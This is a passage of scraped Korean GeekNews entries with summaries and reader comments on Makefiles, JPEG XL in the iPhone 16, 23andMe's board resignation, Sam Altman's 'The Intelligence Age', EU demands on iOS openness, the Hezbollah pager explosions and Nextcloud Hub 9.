          + Make가 vi-vs-emacs 전쟁처럼 논쟁을 불러일으킴
          + Makefile을 최상위 빌드 시스템 드라이버로 사용하는 것이 스마트함
          + 다른 빌드 도구를 사용하더라도 Makefile로 표준화 가능
     * Make의 다양한 활용
          + Make를 다양한 작업 자동화에 사용함
          + 개인 웹사이트 빌드 및 배포에 Makefile 사용
          + Git push와 Git hook을 통해 Make 호출
          + PDF 파일 업로드 및 관리에 Makefile 사용
     * Make의 한계와 대안
          + Make는 작업 실행기로는 괜찮지만, 더 나은 대안이 있음
          + Make/Makefiles는 표준화되지 않음
          + 의존성 해결 불가, configure 스크립트 필요
          + mtime을 사용하여 입력이 최신인지 확인하지만, 문제 발생 가능
          + Unix 철학에 따라 설계되었지만, 현대 빌드 시스템에는 한계가 있음
     * Justfiles로 전환
          + Justfiles로 전환하여 Makefile의 복잡성을 피함
     * Makefile의 단순한 사용
          + Makefile의 단순한 사용을 지지하는 의견
          + 모든 것을 완벽하게 배우지 않고도 공유할 수 있음
          + GitLab CI 파이프라인이 Makefile을 대체한 경험 공유
"
"https://news.hada.io/topic?id=16866","애플이 아이폰16에 JPEG XL을 사용하는 이유와 사진에 미치는 영향 ","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                애플이 아이폰16에 JPEG XL을 사용하는 이유와 사진에 미치는 영향

     * JPEG XL은 2022년 초에 공식 표준화된 차세대 이미지 인코딩 표준
     * 기존 JPEG에 비해 더 높은 이미지 품질을 유지하면서도 파일 크기를 줄여줌
     * Apple의 소프트웨어와 Adobe Camera Raw, Lightroom Classic 등에서는 지원하지만, Chrome, Firefox 등에서는 아직 기본적으로 지원되지 않음
     * JPEG XL의 장점
          + 기존 JPEG 대비 최대 55% 더 작은 파일 크기로 시각적으로 무손실의 더 깨끗한 이미지 제공
          + XYB 색 공간을 사용해 데이터를 효율적으로 저장하고, 적은 데이터로도 높은 이미지 품질 제공
          + 30년 된 JPEG 형식이 가지는 한계를 보완하며, JPEG 압축 시 생기는 아티팩트나 밴딩 같은 문제를 해결
          + HDR, 애니메이션, 알파 투명도, 여러 레이어 지원 등 JPEG이 지원하지 못하는 기능도 제공
          + 광색역 및 고명암비 이미지, RGB/CMYK/YCgCo/XYB 색공간, 최대 32비트 채널, 다중 프레임 지원
          + WebP와 AVIF와 달리 정지 이미지를 염두에 두고 설계됨

Apple의 iPhone 16 Pro에서의 JPEG XL 채택 이유

     * 기존 JPEG 대비 향상된 이미지 품질과 더 나은 압축 성능을 보이기 때문
     * 32MB 크기의 JPEG 이미지를 JPEG XL로 변환 시 24MB로 줄어들고, 손실 없는 형식에서도 약 5MB의 파일 크기로 줄어듦
     * ProRAW 파일을 DNG 컨테이너에 JPEG XL 형식으로 압축하여 유연성을 유지하면서도 파일 크기를 최대 5배까지 줄임
     * JPEG XL 채택의 한계
          + 아직 보편적으로 채택되거나 지원되지 않음
          + 각 사용자는 워크플로와 요구사항을 평가하고 JPEG XL이 적합한지 판단해야 함
          + iOS 17 이상, macOS 14 이상에서 지원되나 .jxl 파일은 DNG 컨테이너에 래핑됨
               o JPEG XL 파일은 DNG 컨테이너에 포함되어 있기 때문에, iPhone 16 Pro에서 바로 .jxl 파일을 보낼 수는 없음
     * JPEG XL의 미래
          + Apple이 JPEG XL을 채택하면서 다른 회사들도 이에 동참할 가능성이 있음
          + JPEG의 많은 문제점을 해결하므로 널리 지원되기를 기대
          + 사진작가에게는 분명히 우수한 포맷
          + JPEG XL은 JPEG와의 역변환을 지원하지만, 추가 개발이 필요
     * iPhone 사진작가에게 미치는 영향
          + 잠재적 단점보다 이점이 훨씬 큼
          + 75MB ProRAW Max 파일이 JPEG XL 압축 사용 시 손실 ProRAW 형식으로 약 20MB
          + 무손실 파일도 50MB 미만으로 품질 손상 없이 상당한 저장 공간 절약 가능

GN⁺의 의견

     * JPEG XL은 사진 품질과 파일 크기 간 균형을 잡은 혁신적인 포맷으로 보임. 환경 영향 감소 측면에서도 긍정적
     * 그러나 보편적 채택이 관건. Apple의 지원은 고무적이나 타 기업들의 동참 없이는 한계 있을 듯
     * 기존 JPEG의 대안으로 WebP, AVIF 등 경쟁 포맷도 있어 향후 JPEG XL의 성장 추이 지켜볼 필요
     * iPhone 사진작가에게는 매력적인 선택지. ProRAW 파일 크기 축소로 저장 공간 절약할 수 있어
     * 단, 타 플랫폼과의 호환성 문제로 당분간은 JPEG 병행 사용이 현실적 대안

   WebP나 똑바로 지원하지

   WebP는 특허가 있어서

   특허 문제면 반쪽짜리 지원조차 못하지 않았을까요
   지금 문제는 지원을 하긴 하지만 나사 빠진 듯이 구현해둬서 애플 기기 호환성을 위해 서비스 제공자들이 낮은 수준의 압축만 해야 하는 건데요

   특허 안 걸리는 데 까지 지원한 거라면 나사 빠진 것도 이해가 되긴 하네요

        Hacker News 의견

     * 좋은 소식임. 최근 JPEG XL의 장점에 대한 훌륭한 비디오를 봄
          + 링크: YouTube 비디오
     * 채택을 늘리기 위해 최신 iPhone 모델에만 제한하지 말았어야 함
          + 1년 된 iPhone 15의 CPU가 JXL 인코딩을 처리하지 못할 이유가 없음
          + 실시간으로 4K 비디오를 인코딩할 수 있으므로 문제가 없어야 함
     * 며칠 전에 전체 기사를 읽었는데, JPEG XL의 약속에 대한 좋은 개요였음
          + Apple의 관점과 PR 부분이 중심 역할을 하는 것이 다소 이상하게 느껴졌음
          + 이미 몇 달 전에 Samsung이 JPEG XL을 채택한 것을 petapixel이 발견했음
          + ""누가 먼저""라는 사소한 논쟁을 제외하고, 경쟁사들이 이미 수용한 공통 표준을 채택하는 것은 완전히 다른 움직임임
          + 이는 JPEG XL의 더 큰 채택을 기대할 수 있음을 의미함
          + 더 많은 주목을 받을 만한 가장 큰 희망의 신호였음
     * .jxl 파일이 DNG 컨테이너에 래핑되어 있어 iPhone 16 Pro에서 .jxl 파일을 바로 사용할 수 없음
          + JPEG XL 지원을 향한 모든 움직임은 좋지만, 이것은 실망스러움
          + Chrome 팀이 jxl 지원을 복원하더라도 이러한 파일을 볼 수 없을 것임
     * 이번에는 표준을 선택해서 다행임
          + HEIC를 출시했을 때는 작동 가능한 오픈 소스 디코더가 하나도 없었음
          + Apple이 아닌 디코더도 없었음
          + XL 색상 깊이가 놀라움
     * 표준 JPEG와 비교했을 때, JPEG XL 파일은 최대 55% 더 작음
          + JPEG ""XL""이라는 이름이 여전히 이상하게 느껴짐
          + 직관적으로 더 큰 파일 크기를 생각하게 됨
     * 브라우저 지원에 대한 최근 개발 사항
          + 링크: Phoronix 기사
     * JPEG XL은 기존 JPEG 파일을 다시 인코딩하여 파일 크기를 줄이면서 원본 파일 품질을 유지할 수 있음
          + 매우 유용한 기능처럼 보이지만, 현재까지 macOS에서 내 기존 사진 라이브러리를 다시 인코딩할 도구를 보지 못했음
     * iPhone 16이 없어서 이 기사가 혼란스러움
          + Apple이 ""raw"" 카메라 캡처에만 jxl을 사용하고, 일반 카메라 캡처에는 사용하지 않는 것인가?
          + 비-raw 사용 사례가 일반 사람들에게 더 큰 영향을 미칠 것 같음
          + 왜? jxl이 HEIC보다 열등한가?
     * JPEG XL이 Apple의 현재 기본 HEIC와 어떻게 비교되는가?
          + HEIC가 결국 JPEG XL로 대체될 것인가?
"
"https://news.hada.io/topic?id=16925","Ask GN: 매일/매주 반복적으로 컴퓨터로 하는 귀찮은(?) 일이 있으신가요?","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              Ask GN: 매일/매주 반복적으로 컴퓨터로 하는 귀찮은(?) 일이 있으신가요?

   매일 아침마다 로그인이 필요한 페이지에 들어가서 일일이 정보를 확인하곤 했는데, 문득 이게 저만의 일인걸까 생각이 들었습니다. 다른 분들께서도 비슷하게 매일/매주/매달 반복적으로 수동으로 하는 번거로운 일들이 있으신가요?

   예를 들어:
     * 매일 아침마다 뉴스레터, 로그인 필요한 뉴스 페이지 들어가 글을 읽고 요약하기
     * 매일 아침마다 지표 보면서 그래프 이상하면 디버깅하기
     * 매일 앱 리뷰 올라오는 걸 읽고 수동으로 제품의 액션 아이템 뽑기

   연차 계획을 세울 때 SaaS형 그룹웨어 시스템이 모바일에서 남은 연차일수를 보여주지 않아 가끔 PC를 켜야하는 상황이 있습니다. 연차일수를 매달 다른 채널로 확인할 수 있으면 만족스러울 것 같아요

   뉴스레터... 라면, Calibre를 이용해서 자동으로 갈무리한 후 킨들로 보내서 읽는 분들이 꽤 있는 것 같습니다.

   저는 매일 아침마다 신규 논문들 서칭하고, 읽을만한 논문을 추리는 작업 + 리뷰를 합니다.

   자동화도 시도해봤는데, 관심있는 주제가 그때그때 다르고, 생각보다 특정 범위의 단어로 정의할 수 없는 경우도 많고, 생각지 못한 논문에서 아이디어를 만나는 경우가 많아서 자동화를 할 수가 없더라고요.
"
"https://news.hada.io/topic?id=16824","23andMe 독립 이사회 전원 사임","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          23andMe 독립 이사회 전원 사임

        Hacker News 의견

     * 23andMe가 두 가지 항암제의 긍정적인 2상 임상 결과를 발표한 바로 다음 날, 이사회가 CEO의 행동에 항의하며 사임함
          + CEO Anne Wojcicki가 주당 $0.40에 회사를 비공개로 전환하려고 시도함
          + 현재 23andMe의 시가총액은 $1억 7천 2백만이며, 경쟁사 Ancestry.com은 $47억에 매각됨
          + 23andMe의 항암제와 같은 계열의 KeyTruda는 2023년까지 누적 매출 $250억을 기록함
          + 회사의 주요 문제는 CEO와 기업 거버넌스 부족임
     * 23andMe에서 일했던 경험이 있는 사람의 의견
     * 왜 이 내용이 투자자 페이지에 게시되었는지 의문을 제기함
     * 최근 데이터 유출로 인한 집단 소송을 해결함
          + $3천만을 지불함
     * DNA를 이러한 회사에 절대 제공하지 않을 것이라는 의견
     * 23andMe의 대안으로 기밀성을 유지할 수 있는 좋은 방법을 찾고 있음
          + Python 패키지를 사용하는 것이 충분한지에 대한 질문
     * 23andMe의 CEO가 한 번도 이메일에 답변하지 않았다는 경험을 공유함
          + 고객의 이메일에 성실히 답변하는 CEO가 있는 회사에 투자하는 것이 돈을 벌 수 있는 방법임
     * 미국에서 태어난 거의 모든 아기가 출생 직후 혈액을 채취하여 유전 질환을 검사함
          + 이는 중요한 공중 보건 프로그램으로, 유전 질환을 조기에 치료할 수 있게 함
          + 그러나 최근 경찰이 범죄 수사를 위해 이 신생아 혈액 샘플에 접근하려고 한다는 뉴스가 있음
          + 이는 공중 보건 프로그램에 대한 신뢰를 위협하고, 모든 미국인의 유전적 프라이버시 권리를 위협함
     * 정부가 결국 23andMe의 경쟁자가 될 것이라는 의견
          + 미국인들이 프라이버시에 크게 신경 쓰지 않기 때문임
"
"https://news.hada.io/topic?id=16909","지능의 시대 (The Intelligence Age) - 샘 알트만","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 지능의 시대 (The Intelligence Age) - 샘 알트만

AI가 가져올 엄청난 변화

     * 향후 몇 십 년 동안 우리 조상들이 마법처럼 여겼을 일들을 할 수 있게 될 것임
     * 이러한 현상은 새로운 것은 아니지만, AI로 인해 더욱 가속화될 것임
     * 유전적 변화 때문이 아니라 사회 기반 시설 자체가 우리 개개인보다 훨씬 더 똑똑하고 유능해졌기 때문에 인간의 능력이 크게 향상되었음
     * AI는 사람들에게 어려운 문제를 해결할 수 있는 도구를 제공하고, 우리 스스로는 알아낼 수 없었던 새로운 발전을 이룰 수 있게 도와줄 것임

AI가 가져다 줄 개인 맞춤형 솔루션

     * 곧 AI의 도움으로 AI 없이는 결코 할 수 없었던 일들을 훨씬 더 많이 해낼 수 있게 될 것임
     * 궁극적으로는 각자 상상할 수 있는 거의 모든 것을 만들어낼 수 있는 다양한 분야의 가상 전문가들로 구성된 개인 AI 팀을 갖출 수 있게 될 것임
     * 우리 아이들은 어떤 과목이든, 어떤 언어로든, 필요한 속도에 맞춰 개인 맞춤형 교육을 제공하는 가상 튜터를 갖게 될 것임
     * 더 나은 의료, 누구나 상상할 수 있는 모든 종류의 소프트웨어를 만드는 능력 등에 대해서도 비슷한 아이디어를 생각해 볼 수 있음

공유된 번영의 시대

     * 이러한 새로운 능력으로 오늘날로서는 상상할 수 없을 정도로 공유된 번영을 누릴 수 있게 될 것임
     * 미래에는 모든 사람의 삶이 지금 누구의 삶보다도 더 나아질 수 있음
     * 번영이 반드시 사람들을 행복하게 만들지는 않지만, 전 세계 사람들의 삶을 의미 있게 개선시킬 것임

역사상 가장 중대한 사실

     * 수천 년 동안 과학적 발견과 기술 진보가 축적된 끝에, 우리는 모래를 녹이고 불순물을 추가하며 놀라울 정도로 정밀하고 극도로 작은 규모로 컴퓨터 칩을 배열하고 에너지를 흘려보내는 방법을 알아냈고, 그 결과 점점 더 유능한 AI를 만들어 낼 수 있는 시스템을 갖추게 되었음
     * 이는 지금까지 모든 역사상 가장 중대한 사실일 수 있음
     * 몇 천 일 안에 초지능을 갖출 수도 있음. 더 오래 걸릴 수도 있지만 결국에는 그곳에 도달할 것이라고 확신함

Deep Learning의 성공

     * Deep Learning이 성공했기 때문에 우리는 번영의 다음 도약의 문턱에 서게 되었음
     * Deep Learning은 정말로 모든 데이터 분포(또는 모든 데이터 분포를 생성하는 기본 ""규칙"")를 학습할 수 있는 알고리듬임
     * 놀라울 정도로 정확하게, 사용 가능한 컴퓨팅 능력과 데이터가 많을수록 사람들이 어려운 문제를 해결하는 데 더 도움이 됨
     * 아직 해결해야 할 세부 사항들이 많지만, 특정 과제에 주의를 빼앗기는 것은 실수임. Deep Learning은 작동하며, 우리는 남아있는 문제들을 해결할 것임

AI 시스템의 발전 전망

     * AI 모델은 곧 의료 관리를 조정하는 등 우리를 대신해 특정 작업을 수행하는 자율 개인 비서 역할을 할 것임
     * 향후 어느 시점에서는 AI 시스템이 너무 뛰어나져서 차세대 시스템을 만드는 데 도움을 주고 전반적인 과학 발전을 이룰 것임
     * 기술은 우리를 석기 시대에서 농경 시대로, 그리고 산업 시대로 이끌었음. 앞으로 지능 시대로 가는 길은 컴퓨팅, 에너지, 인간의 의지로 포장될 것임

AI 인프라 확충의 필요성

     * 가능한 한 많은 사람들에게 AI를 제공하려면 컴퓨팅 비용을 낮추고 풍부하게 만들어야 함 (이를 위해서는 많은 에너지와 칩이 필요함)
     * 충분한 인프라를 구축하지 않으면 AI는 전쟁의 대상이 되고 주로 부자들의 도구가 되는 매우 제한적인 자원이 될 것임
     * 현명하게 행동해야 하지만 확신을 가지고 행동해야 함. 지능 시대의 여명은 매우 복잡하고 엄청나게 중요한 도전 과제를 안고 있는 중대한 발전임

밝은 미래에 대한 믿음

     * 미래는 너무나 밝아서 지금 그것에 대해 글을 쓰려고 해도 아무도 그것을 제대로 표현할 수 없을 것임
     * 지능 시대의 특징은 엄청난 번영이 될 것임
     * 점진적으로 일어나겠지만, 기후 문제 해결, 우주 식민지 건설, 모든 물리학의 발견과 같은 놀라운 승리는 결국 흔한 일이 될 것임
     * 거의 무한한 지능과 풍부한 에너지, 즉 위대한 아이디어를 만들어 내고 그것을 실현시킬 수 있는 능력이 있다면 우리는 상당히 많은 일을 할 수 있음

AI의 위험 요소 최소화 필요성

     * 다른 기술에서 보았듯이 단점도 있을 것이며, AI의 이점을 최대화하고 해로운 점을 최소화하기 위해 지금부터 노력을 시작해야 함
     * 한 가지 예로, 이 기술이 향후 수년 내에 노동 시장에 상당한 변화(좋은 면과 나쁜 면)를 초래할 수 있을 것으로 예상되지만, 대부분의 일자리는 대부분의 사람들이 생각하는 것보다 더 천천히 변할 것이며, 우리가 할 일이 바닥날 것이라는 두려움은 없음

확장하는 세계에서의 긍정적 게임

     * 사람들은 무언가를 만들고 서로에게 유용하고자 하는 타고난 욕구가 있으며, AI는 우리 자신의 능력을 그 어느 때보다도 증폭시킬 수 있게 해줄 것임
     * 사회로서 우리는 다시 확장하는 세계에 있게 될 것이며, 우리는 다시 긍정적인 합산 게임에 집중할 수 있음
     * 오늘날 우리가 하는 많은 일들은 몇 백 년 전 사람들에게는 하찮은 시간 낭비로 보였겠지만, 아무도 과거를 돌아보며 가로등 점등원이 되길 바라지는 않음
     * 가로등 점등원이 오늘날의 세계를 본다면, 그를 둘러싼 모든 번영이 상상할 수 없는 것처럼 느껴질 것임. 그리고 우리가 지금부터 100년 후로 빨리 감기를 할 수 있다면, 우리 주변의 번영은 똑같이 상상할 수 없을 만큼 느껴질 것임

GN+의 의견

     * AI의 발전은 인류 역사상 가장 큰 변곡점 중 하나가 될 수 있음. 기술의 발전이 인간의 삶에 가져온 변화를 생각해보면 AI가 미칠 영향력은 상상을 초월할 것임
     * AI로 인한 노동 시장의 변화는 불가피해 보이나, 인간만이 할 수 있는 창의적이고 감성적인 영역은 여전히 존재할 것임. 핵심은 AI와 협업하며 인간 고유의 가치를 발휘하는 것
     * 기후 위기, 에너지 고갈, 불평등 심화 등 인류가 직면한 문제 해결에 AI가 기여할 수 있을 것임. 동시에 AI로 인한 부작용도 최소화해야 함
     * 특히 AI가 소수에 의해 독점되지 않고 모두를 위해 활용되도록 하는 것이 중요함. 이를 위해 정부와 기업, 시민사회가 협력해야 함
     * Anthropic의 Claude, Stability AI의 StableLM, OpenAI의 GPT 등 대형 언어모델 간 경쟁이 가속화되고 있음. 기술 발전과 함께 AI의 윤리적 활용에 대한 논의도 활발해질 것으로 보임

   이미 전 인류가 먹고 살기에 충분한 식량과 재화를 생산하고 있지만 분배는 되지 않고 있으죠.
   이 분배 문제를 먼저 해결하지 않는 한, AI를 통한 생산성 증대는 양극화만 가속화되어 극상위 부자들만의 세상이 될 것 같네요.

   동의합니다. 그에 따라 기본소득이 당연히 논의되어야 하는데 우리나라는 가망이 없어 보이고요 ㅋ

   기본 소득 주장에 으레 나오는 반박이 세수 확보 문제인데, 이에 관해서 아직까지 뾰족한 수는 없는 것 같습니다

   AI의 거두 알트먼이 AI 처음 나왔을 때의 기대에 부풀었던 모습 그대로 적었네요.
   저나 주변 사람들이나 chat gpt 등 쓰다보니 더 빠른 인터넷 검색 수준에서 크게 벗어나지 못하고 있고
   AI결합 서비스들도 그다지 신통치 않은데요.
   주식 가격 올리고 싶은 마음이 많이 보이네요.

   인류는 대기중 온실가스 농도를 단 한 해도 줄여본 적이 없습니다. 기껏해야 코로나 사태로 증가폭이 둔화된 사례가 있을 뿐입니다. 즉, 브레이크조차 밟아본 적이 없는데 감히 어떻게 후진을 논할까요? 계속되는 초지능 hype. 근데 이제 기후위기를 곁들인.

   우리는 다가오는 위협을 어떻게 헷지해야 할까요? 빅테크 주식이라도 사야할까요?

   AI는 의식의 확장을 위한 수단입니다. 물질 진화를 통해 인체가 마련되고, 이성과 과학의 발전으로 의식이 발전했고, 이제 그 의식을 통제하기 위해 영성 문명의 시대가 열릴 것입니다.

   처음에는 AI를 활용하여 풍성한 어휘와 정교한 그림 및 사진으로 다양한 커뮤니케이션을 하겠지만, AI가 보편화되면 그들만의 최적의 의사 소통 방법을 통해서 인류가 이해할 수 없는 방법으로 정보를 주고 받는 시대가 올 수도 있겠죠?

   Ai로 아이들에게 도움을 주는게 아니라 아이들이 Ai와 싸워야 할 가능성이 높음..이길 가망성은 거의 없다고 생각함..그나마 돈이라도 있으면 버틸 가능성이 있으나 그것도 오래가지 못할 것 같음..얼마나 걸릴지가 관건인 것 같음..
   핵처럼 제한을 걸지도 모르겠음 그것도 얼마나 버틸지 알 수가 없음..

   기후 문제 해결을 보면 경제가 발전하면서 에너지 소비를 덜 하게 된다고 주장하는 셈인데 인간의 심리로 그게 가능하긴 한지 의문입니다. 불평등 심화의 문제도 마찬가지로 사람의 문제인데 그걸 왜, 어떻게 기술로 해결하겠다는 건지 잘 모르겠네요. 이런 글이 기술 낙관주의의 예시인 건가 싶기도 합니다

   AI로 노동 없는 세상이 정말 온다고 해도 그로써 불평등의 해결이 된다는 주장은 낙수효과와 같은 어이없는 낙관론이죠.
   AI와 연결된 생산 시설을 가진 이들이 모든 부를 독점하고 나머지들에게 아주 일부분을 선심 쓰듯이 던져주겠죠.

   폭발적인 성장이 일어나면 일부가 모든 부를 독점하게 되고 그런 상황에 물리적인 혁명을 제외하고는 해결할 방법이 없다는 것을 역사가 꾸준히 증명했죠.

   시민들이 자신의 권리를 적극적으로 주장하지 않는 이상 결국 모든 것은 일부 소수들에게 돌아갈 것입니다.

   AI 라는 생산수단을 독점함으로써 오히려 불평등이 심화될 것 같네요.

   네 저도 그렇게 생각합니다. 인류 역사 전체에서 반복되어 나타나는 현상인데 이번에는 다를 것이라고 주장하는 게 참 어처구니가 없습니다

        Hacker News 의견

     * AI를 많은 사람들에게 제공하려면 컴퓨팅 비용을 낮추고 인프라를 확충해야 함
          + 인프라 부족 시 AI는 제한된 자원이 되어 전쟁의 원인이 될 수 있음
          + AI 상업화가 중요하며, 자금 조달 제약이 문제임
     * 딥러닝은 효과적이며, AI는 규모가 커질수록 더 나아질 것임
          + AI를 자주 사용하지만, AI 개발자와 판매자에 대한 회의감이 있음
          + AI의 성능 향상은 점점 더 많은 데이터와 계산 자원을 필요로 함
     * ""몇 천일""이라는 표현은 ""약 10년""을 의미하며, 마케팅 심리학적 트릭임
          + ""몇 천일""은 ""10년""보다 다른 의미로 느껴짐
     * 인간이 모든 데이터 분포를 학습할 수 있는 알고리즘을 발견했다는 주장에 회의적임
          + Universal Approximation Theorem을 잘못 해석한 것임
          + 최적의 매개변수를 학습하는 알고리즘이 있다는 주장은 근거가 없음
     * 지능 시대의 특징은 대규모 번영이 될 것이라는 주장에 회의적임
          + AI는 불평등과 불공정을 가속화할 것임
          + 기술 발전은 자원과 가치를 포착하는 데 집중되어 있음
          + 경제 활동이 추적되지만 자산 소유자는 불분명함
     * 자녀들이 가상 튜터를 통해 맞춤형 교육을 받을 수 있을 것임
          + 이미 AI를 사용하여 책이나 기사를 업로드하고 대화하는 방식으로 활용 중임
          + 디지털 화이트보드와의 협업 기능이 부족함
     * OAI의 성과는 놀랍지만, 인간 스타일의 저렴한 지능이 큰 영향을 미치지 않을 것임
          + 현재의 문제는 지능이 아니라 자금 조달임
          + AI가 비용을 줄여도 실제로 가치 있는 프로젝트는 적을 것임
     * AI가 교육의 정점이 될 것이라는 주장은 무의미하게 느껴짐
          + AI가 모든 작업을 수행한다면 교육의 의미가 없어질 것임
          + 인간 지능이 AI에 뒤처지는 세상에서는 교육이 현재와 다를 것임
     * AI가 자율적인 개인 비서로서 특정 작업을 수행할 것이라는 주장은 상상력이 부족함
          + 복잡한 시스템을 AI가 해결하는 대신 시스템 자체를 개선하는 것이 더 나을 것임

   '몇천일' 파트에서 우매한 독자들 관심이나 끌려는 짜치는 글이라는 생각이 들어서 흥미가 확 떨어졌습니다 ㅋㅋ

   멀리 내다볼 것도 없이 당장 OpenAI만 해도 점유율 좀 오르니 원래의 목표를 잊고 GPT3의 오픈소스화를 거부했죠.

   자기들 말로는 비용 충당을 위해 그랬다는데 오픈소스랑 수익화랑은 별 관계가 없고요. 어차피 개인은 돌릴 리소스 없고 기업들은 돈 내고 써야하죠. 오픈소스로 공개한 다른 회사들은 뭘까요.

   AI가 불평등을 심화시켰으면 심화시켰지 완화할 일은 없을 것 같네요.

   인정합니다
   한 사람의 생산성(혹은 영향력)이 올라가면 필연적으로 빈부격차로 이어지죠

   AI가 전 인류가 풍족하게 살 수 있도록 만들고 인류의 목표여야 한다는 듯한 태도는 참으로 오만하기 짝이 없네요. 가자에서 포격을 받고 죽어가는 민간인들에게 AI가 정말 도움이 될까요? 알츠하이머로 기억을 잃어가는 노인들에게 AI를 쥐어주면 뭔가 나아질까요? AI가 세상에 긍정적인 영향을 미칠 것이라고 생각하는 것은 이해하지만 마치 AI가 인류의 궁극적 발전 목표여야 한다는 태도는 실체에 비해 너무 부풀려진 것 같네요.

   일견 동의합니다만, 들어주신 예시는 다소 극단적인 듯 합니다.
   인터넷 기술과 비교해서 생각해보면 좋을 것 같습니다.
   엄청난 부자와 빈자가 탄생했고, 많은 사람을 휴대폰 혹은 컴퓨터 앞에서 살아가게 만들었지만, 정작 그것을 사용하는 사람들은 나름 행복하게 살아갑니다. 넷플릭스나 유튜브를 취미로 보면서 적어도 불행하다고 말하는 사람은 거의 없죠.
   AI도 비슷하지 않을까 싶습니다. AI가 보편화되면 대부분의 사람들이 단순히 데이터를 분류하거나 P2E 같은 행위에 몰두하게 될 것 같습니다. 지금 보기엔 너무 바보 같고 무가치해보일 지언정 그 시대를 살아가는 사람들은 그게 행복이라고 믿고 살아가지 않을까요?
"
"https://news.hada.io/topic?id=16839","EU, 아이폰에 IOS 타사 개방 요구","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         EU, 아이폰에 IOS 타사 개방 요구

   정당한 요구라고 생각합니다

   ""난민, EU에 영토 개방 요구""와 비슷한 느낌이네요. 최소한 EU가 애플에 요구하는 것보다는 역사적 정당성이 있죠.

   핸드폰이 개인 디바이스 중 메인이 되어가고 있기 때문에 시장에서 이정도는 요구할 수 있다고 봅니다. 이대로 계속 폐쇄성이 유지되면 아이폰 사용자는 애플에서 만든 주변 기기만 사용해야 하는 시기가 올겁니다.

   와 이건 아닌거 같은데....
   아이폰 아이덴터티 까지 건드리네

   와 흥미진진하네요 ㅋㅋㅋ

   https://ec.europa.eu/commission/presscorner/detail/en/ip_24_4761
   이번에는 스마트워치, 헤드폰, VR 헤드셋에 대한 연결 기능을 개방하라고 요구했습니다

   203x EU : 애플은 모든 소스를 공개하라
"
"https://news.hada.io/topic?id=16814","헤즈볼라 페이저 폭발로 레바논에서 다수 사망","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        헤즈볼라 페이저 폭발로 레바논에서 다수 사망

        Hacker News 의견

     * 이스라엘의 공급망 공격은 단기적으로는 똑똑한 전략이지만 장기적인 결과에 대한 우려가 있음
          + 제3국이 이스라엘을 공급망에 포함시키는 것을 주저할 수 있음
          + 다른 주요 생산자들이 이 전술을 모방할 위험이 있음
          + 지역 내 또는 그 이상에서 추가적인 긴장 고조 가능성 있음
     * The New York Times에 따르면, 이스라엘이 대만에서 제조된 Gold Apollo 호출기에 폭발물을 숨겨 레바논으로 수입했음
          + 폭발물은 배터리 옆에 설치되었고 원격으로 폭발할 수 있는 스위치가 있었음
     * 기술적 측면에 초점을 맞추면, 이 사건은 Stuxnet을 떠올리게 함
          + 장치에 심어진 것인지, 아니면 유사한 장치를 역설계하여 페이로드를 보낸 것인지 궁금함
     * 인상적인 공급망 해킹 사례임
          + 적의 통신 네트워크를 완전히 파괴하고 혼란을 일으킴
          + 적은 피해로 최대 효과를 거둔 전략임
     * 제조 아웃소싱이 국가 안보 문제임을 보여주는 또 다른 사례임
          + 절대적인 자유 시장이 ""성공""을 추구하다가 스스로를 해칠 수 있음
     * Amir Tsarfati의 Telegram 업데이트:
          + 4000명 부상, 그 중 400명은 중태
          + Al Jazeera에 따르면, 호출기는 5개월 전에 레바논으로 반입되었고 사전에 폭발물이 설치되었음
          + 각 장치는 20그램 이하의 폭발물을 포함하고 있었음
     * 수정된 호출기가 일반 유통에 들어갈 가능성으로 인해 많은 부수적 피해가 발생할 수 있음
          + 호출기가 Hezbollah가 아닌 다른 사람들에게 전달될 가능성 있음
     * 기술적 관점에서 놀라운 공격임
          + 호출기는 오랫동안 손상되었음
          + 이스라엘이 저기술 통신을 가로채고 조작할 수 있음을 보여줌
          + 다음 단계는 병원 기록 시스템을 해킹하여 오늘 입원한 환자 목록을 얻는 것임
     * 이 해킹이 가능성이 낮다고 생각함
          + 배터리 폭발로 인한 피해로 보기에는 너무 큼
          + 장치가 동시에 여러 위치에서 폭발했음
          + HA가 폭발물이 심어진 불량 배치를 구매했을 가능성 있음
     * The Wire의 클래식 장면이 떠오름
          + 형사가 사전에 도청된 휴대폰을 마약 조직에 판매하는 장면임
"
"https://news.hada.io/topic?id=16890","Nextcloud: 오픈소스 클라우드 앱","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         Nextcloud: 오픈소스 클라우드 앱

Nextcloud Hub 9 출시

     * 데이터 통제
          + 원격 협업을 쉽게 함
          + 온프레미스 또는 클라우드에서 사용 가능
          + 맞춤형 및 확장 가능
          + 제3자에게 데이터 유출 없음
     * 수천 개의 조직에서 신뢰받는 플랫폼
          + 수백만 명의 사용자가 있는 수천 개의 조직에서 가장 인기 있는 오픈 소스 콘텐츠 협업 플랫폼
          + Nextcloud Hub는 Files, Talk, Groupware, Office를 통합하여 협업 흐름을 최적화함

Nextcloud Hub

     * 어디서나 쉽게 접근 가능
     * 강력한 접근 제어
     * 인프라 통합
     * 사용자 친화적 설계

Nextcloud Files

     * 자체 호스팅 파일 저장 및 동기화 플랫폼
          + 데스크탑, 모바일, 웹 인터페이스를 통한 강력한 협업 기능 제공

Nextcloud Talk

Nextcloud Groupware

Nextcloud Office

Nextcloud Assistant

솔루션

     * Nextcloud 사용 사례
          + 공공 부문
               o 디지털 주권에 대한 우려로 외국 클라우드 제공업체를 피하고 안전한 자체 호스팅 클라우드 파일 저장 플랫폼을 선택함
          + 기업
               o 온라인 협업 기술을 통해 효율성을 높이고 원격 작업을 촉진하며, Nextcloud를 전략적으로 배치하여 규정 준수, 비용 및 데이터 유출 위험을 줄임
          + 서비스 제공업체
               o 인프라를 활용하고 쉽게 확장 가능한 완전한 브랜드의 클라우드 저장 소프트웨어 및 협업 도구로 고객을 유지함
          + 교육
               o 학술 데이터 및 학생 개인 정보 보호가 중요한 규제 산업에서 규정을 준수하는 파일 동기화 협업 도구를 제공함

Nextcloud를 집에서 사용하기

     * 연락처
          + 위험을 줄이고 원격 팀 커뮤니케이션을 개선하며 운영 비용을 최소화하는 오픈 소스 클라우드 파일 저장 및 콘텐츠 협업 플랫폼

Nextcloud의 인기 요인

     * 생산성
          + 사무실이나 이동 중에도 플랫폼 간 생산성을 높이고, 조직 경계를 넘어 데이터를 공유하고 협업하며 소통할 수 있음
